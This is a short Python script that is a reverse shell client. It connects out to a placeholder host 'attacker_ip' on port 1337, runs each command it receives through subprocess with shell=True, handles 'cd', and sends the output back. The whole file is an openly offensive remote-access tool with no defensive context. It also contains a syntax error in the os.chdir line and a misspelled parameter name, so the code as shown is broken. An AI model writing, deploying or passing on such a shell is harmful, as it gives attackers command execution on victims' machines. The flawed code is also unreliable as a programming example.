import socket
import subprocess

# import a library for change directory
import os

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload.connect(("attacker_ip", 1337))

print("Connected")

def send_data(ouput_data):
    size_of_data = len(ouput_data)
    size_of_data = str(size_of_data)
    payload.send(bytes(size_of_data, "utf-8"))
    payload.send(ouput_data)
 
while True:
	cmd = payload.recv(2048)
	cmd = cmd.decode("utf-8") # string
	
	if cmd == "quit": # no longer need to decode with byte
		payload.close()
		break
	
	# Change Directory (cd)
	elif cmd[:2] == "cd": # Check initial part (cd) slice using string [:index]
		# use os module and chdir function (change directory)
		os.chdir.(cmd[3:]) # give the command the 2nd argument after (cd)
		continue

	try:
		output = subprocess.check_output(cmd, shell = True)
	except subprocess.CalledProcessError:
		send_data(b"Wrong command")
	else:
		send_data(output)

print("Disconnected") # display disconnection message
